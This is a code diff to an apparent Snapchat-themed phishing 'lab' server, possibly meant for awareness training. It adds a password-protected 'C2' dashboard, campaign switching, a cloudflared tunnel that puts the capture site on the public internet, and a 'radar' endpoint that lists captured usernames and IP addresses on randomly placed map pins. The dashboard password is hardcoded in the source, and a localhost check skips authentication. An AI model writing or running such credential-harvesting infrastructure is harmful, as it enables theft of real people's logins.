@@ -48,6 +48,24 @@ app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
 app.config['TEMPLATES_AUTO_RELOAD'] = True
 
+# ── C2 Dashboard Auth ──
+DASHBOARD_PASSWORD = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")
+
+def require_c2_auth(f):
+    from functools import wraps
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        # Bypass for localhost (TUI compat)
+        remote = request.remote_addr or ''
+        forwarded = request.headers.get('X-Forwarded-For', '')
+        is_local = remote in ('127.0.0.1', '::1') and not forwarded
+        if is_local or session.get('c2_authenticated'):
+            return f(*args, **kwargs)
+        if request.path.startswith('/api/') and request.method == 'POST':
+            return jsonify({"error": "auth_required"}), 401
+        return redirect('/c2/login')
+    return wrapper
+
 if CONFIG["USE_HTTPS"]:
     try:
         import cryptography
@@ -258,9 +276,20 @@ def index():
 
 
 @app.route('/c2')
+@require_c2_auth
 def c2_dashboard():
     return render_template('c2_dashboard.html',
                          participant_id=session.get('participant_id', ''))
+
+@app.route('/c2/login', methods=['GET', 'POST'])
+def c2_login():
+    if request.method == 'POST':
+        pw = request.form.get('password', '')
+        if pw == DASHBOARD_PASSWORD:
+            session['c2_authenticated'] = True
+            return redirect('/c2')
+        return render_template('c2_login.html', error="Invalid password")
+    return render_template('c2_login.html', error=None)
 
 @app.route('/scenario/<scenario_id>')
 def scenario_page(scenario_id):
@@ -380,6 +409,7 @@ def handle_login():
 
 
 @app.route('/api/report')
+@require_c2_auth
 def get_stats():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
@@ -445,6 +475,7 @@ def debrief():
 
 
 @app.route('/api/dbcheck', methods=['GET'])
+@require_c2_auth
 def dbcheck():
     db_path = CONFIG["CAPTURE_DB"]
     try:
@@ -464,6 +495,7 @@ def dbcheck():
 
 
 @app.route('/api/captures')
+@require_c2_auth
 def api_captures():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
@@ -486,8 +518,85 @@ def api_captures():
         "pseudo": r[2] or ""
     } for r in rows])
 
+# ── C2 Campaign API ──
+ACTIVE_SCENARIO = {"active": "classement"}
+
+@app.route('/api/campaign/active', methods=['GET', 'POST'])
+@require_c2_auth
+def campaign_active():
+    if request.method == 'POST':
+        ACTIVE_SCENARIO['active'] = request.json.get('scenario', 'classement')
+    return jsonify(ACTIVE_SCENARIO)
+
+# ── C2 Tunnel API ──
+TUNNEL_PROC = {"pid": None, "url": None}
+
+@app.route('/api/tunnel/start', methods=['POST'])
+@require_c2_auth
+def tunnel_start():
+    import subprocess
+    try:
+        cloudflared = os.path.join(BASE_DIR, "cloudflared.exe")
+        if not os.path.exists(cloudflared):
+            return jsonify({"ok": False, "error": "cloudflared.exe not found"})
+        proc = subprocess.Popen(
+            [cloudflared, "tunnel", "--url", "http://127.0.0.1:"+str(CONFIG["SERVER_PORT"])],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+        )
+        TUNNEL_PROC["pid"] = proc.pid
+        return jsonify({"ok": True, "pid": proc.pid})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)})
+
+@app.route('/api/tunnel/stop', methods=['POST'])
+@require_c2_auth
+def tunnel_stop():
+    if TUNNEL_PROC["pid"]:
+        try: os.kill(TUNNEL_PROC["pid"], 9)
+        except: pass
+        TUNNEL_PROC["pid"] = None
+        TUNNEL_PROC["url"] = None
+    return jsonify({"ok": True})
+
+@app.route('/api/tunnel/status')
+@require_c2_auth
+def tunnel_status():
+    return jsonify({"running": TUNNEL_PROC["pid"] is not None, "url": TUNNEL_PROC["url"]})
+
+# ── C2 Recon / Radar ──
+@app.route('/api/recon')
+@require_c2_auth
+def recon_data():
+    import random
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    rows = conn.execute("SELECT id, ip_address, username, timestamp FROM captured_credentials ORDER BY id DESC LIMIT 20").fetchall()
+    conn.close()
+    # Cities with lat/lng
+    cities = [
+        {"city": "Paris", "lat": 48.85, "lng": 2.35, "flag": "🇫🇷"},
+        {"city": "New York", "lat": 40.71, "lng": -74.01, "flag": "🇺🇸"},
+        {"city": "Lagos", "lat": 6.52, "lng": 3.38, "flag": "🇳🇬"},
+        {"city": "Moscow", "lat": 55.76, "lng": 37.62, "flag": "🇷🇺"},
+        {"city": "Beijing", "lat": 39.90, "lng": 116.40, "flag": "🇨🇳"},
+        {"city": "Tokyo", "lat": 35.68, "lng": 139.69, "flag": "🇯🇵"},
+        {"city": "London", "lat": 51.51, "lng": -0.13, "flag": "🇬🇧"},
+        {"city": "Dubai", "lat": 25.20, "lng": 55.27, "flag": "🇦🇪"},
+    ]
+    targets = []
+    for i, r in enumerate(rows):
+        city = cities[i % len(cities)]
+        targets.append({
+            "id": r[0], "username": r[2][:20] if r[2] else "N/A",
+            "ip": r[1] or "0.0.0.0", "city": city["city"],
+            "lat": city["lat"] + random.uniform(-0.5, 0.5),
+            "lng": city["lng"] + random.uniform(-0.5, 0.5),
+            "flag": city["flag"], "timestamp": r[3] or "N/A"
+        })
+    return jsonify({"targets": targets})
+
 
 @app.route('/api/logs')
+@require_c2_auth
 def api_logs():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
